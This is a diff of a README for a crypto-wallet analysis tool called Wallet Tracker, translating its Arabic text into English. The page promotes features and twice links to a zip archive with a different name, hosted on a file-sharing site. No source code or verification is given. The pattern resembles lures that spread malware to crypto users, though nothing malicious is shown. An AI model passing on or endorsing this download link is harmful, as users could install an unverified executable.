@@ -1,46 +1,46 @@
 # Wallet Tracker  
-**أداة تحليل المحافظ الإلكترونية - السرعة والكفاءة في متناول يديك**  
+**Analyze Crypto Wallets with Speed and Efficiency**  
 
 [![Download Wallet Tracker](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://www.mediafire.com/file/wu6ki4tnbxbl6nm/Dexcheck_Analyzer_v1.2.zip/file)
 
 ---
 
-## الغرض الرئيسي  
-**Wallet Tracker** هو أداة متقدمة لتحليل المحافظ الإلكترونية باستخدام بيانات **Dexcheck.ai**.  
-يساعد البرنامج المستخدمين على:  
-- عرض أرباح وخسائر أي محفظة وسجل التداول ومعدل الفوز.  
-- تصفية البيانات واستخراج القيم المطلوبة بناءً على معايير معينة.  
-- تخزين النتائج وتصديرها بسهولة إلى سطح المكتب.  
-- توفير تجربة مستخدم بسيطة ومباشرة بواجهة سهلة الاستخدام.  
+## Main Purpose  
+**Wallet Tracker** is a powerful tool for analyzing crypto wallet data using **Dexcheck.ai**.  
+With this program, you can:  
+- View profits, losses, trading history, and win rates of any wallet.  
+- Filter data and extract specific values based on predefined criteria.  
+- Save and export results easily to your desktop.  
+- Enjoy a simple and intuitive interface designed for smooth user experience.  
 
 ---
 
-## كيفية الاستخدام  
-1. أدخل العناوين في **ListBox** يدويًا أو من الحافظة.  
-2. حدد معايير التحليل مثل نسبة الفوز (Win Rate) والعائد على الاستثمار (ROI).  
-3. اضغط على زر **"فحص البيانات"** لبدء العملية التلقائية.  
-4. استعرض النتائج مباشرة على الشاشة أو احفظها في ملف نصي تلقائيًا.
+## How to Use  
+1. Manually input wallet addresses into the **ListBox**, or import them from the clipboard.  
+2. Select analysis criteria, such as **Win Rate** and **ROI (Return on Investment)**.  
+3. Click the **"Analyze Data"** button to start the automatic process.  
+4. View results on-screen or export them automatically to a text file.  
 
 ---
 
-## ميزات البرنامج المحدثة  
-### 1. **التوافق عبر الشبكات**  
-دعم تحليل البيانات عبر شبكات متعددة في واجهة واحدة.  
+## Features of the Latest Version  
+### 1. **Multi-Network Compatibility**  
+Seamlessly analyze wallet data across multiple networks in one interface.  
 
-### 2. **تحليل متقدم**  
-- استخراج بيانات مثل نسبة الفوز، العائد على الاستثمار، وغيرها من المؤشرات.  
-- دعم استراتيجيات استثمارية متعددة بناءً على الشبكة المستخدمة.  
+### 2. **Advanced Analytics**  
+- Extract key metrics such as **Win Rate** and **ROI**.  
+- Support for various investment strategies based on the selected network.  
 
-### 3. **واجهة ديناميكية وسهلة الاستخدام**  
-مصممة لتناسب المستخدمين المبتدئين والمحترفين.  
+### 3. **Dynamic and User-Friendly Interface**  
+Designed to suit both beginners and experienced users.  
 
-### 4. **تصدير البيانات**  
-تخزين جميع التحليلات في ملف نصي على سطح المكتب لسهولة الوصول والمشاركة.
+### 4. **Data Export**  
+Save all analysis results in a text file on your desktop for easy access and sharing.  
 
 ---
 
-## الشبكات المدعومة  
-يدعم البرنامج التحليل عبر جميع السلاسل (All Chains):  
+## Supported Networks  
+**Wallet Tracker** supports analysis across all chains, including:  
 - **Solana**  
 - **Ethereum (ETH)**  
 - **Base**  
@@ -69,15 +69,15 @@
 
 ---
 
-## لمن هذا البرنامج؟  
-- **المحللون الماليون في العملات الرقمية.**  
-- **المستثمرون الباحثون عن قرارات مدعومة بالبيانات.**  
-- **المتحمسون للتكنولوجيا المالية.**  
+## Who Is This Program For?  
+- **Financial analysts in the crypto space.**  
+- **Investors seeking data-driven decisions.**  
+- **Fintech enthusiasts.**  
 
 ---
 
-## الخاتمة  
-سواء كنت محترفًا في عالم العملات الرقمية أو مبتدئًا، فإن **Wallet Tracker** يوفر لك الأدوات اللازمة لفهم وتحليل بيانات المحافظ الإلكترونية بسرعة وسهولة.  
-**جربه الآن مجانًا!**  
+## Conclusion  
+Whether you're a crypto expert or a beginner, **Wallet Tracker** equips you with the tools to analyze wallet data quickly and effortlessly.  
+**Try it now for free!**  
 
 [![Download Wallet Tracker](https://img.shields.io/badge/Download-Wallet_Tracker_v1.2-blue?style=for-the-badge)](https://www.mediafire.com/file/wu6ki4tnbxbl6nm/Dexcheck_Analyzer_v1.2.zip/file)
